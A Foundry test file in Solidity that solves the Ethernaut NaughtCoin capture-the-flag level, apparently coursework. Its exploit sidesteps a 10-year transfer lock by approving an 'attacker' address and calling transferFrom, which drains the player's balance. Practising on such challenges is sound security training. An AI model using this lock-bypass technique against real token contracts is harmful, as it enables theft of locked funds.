// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {NaughtCoin} from "../../src/Week8-9/Ethernaut_NaughtCoin.sol";

/**
 * NaughtCoin is an ERC20 token and you're already holding all of them.
 * The catch is that you'll only be able to transfer them after a 10 year lockout period.
 * Can you figure out how to get them out to another address so that you can transfer them freely?
 * Complete this level by getting your token balance to 0.
 */

//forge test --match-contract NaughtCoinTest -vvvv
contract NaughtCoinTest is Test {
    NaughtCoin naughtCoin;
    address player = address(this);
    address attacker = address(0xBad);

    function setUp() public {
        //player starts with 1_000_000 tokens with 10 year transfer lockout
        naughtCoin = new NaughtCoin(player);
    }

    function testExploit() public {
        vm.startPrank(player);
        naughtCoin.approve(attacker, 1000000 * 10 ** 18); // 1_000_000
        vm.stopPrank();

        vm.startPrank(attacker);
        naughtCoin.transferFrom(player, attacker, 1000000 * 10 ** 18); // 1_000_000
        vm.stopPrank();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(naughtCoin.balanceOf(player) == 0, "Challenge Incomplete");
    }
}
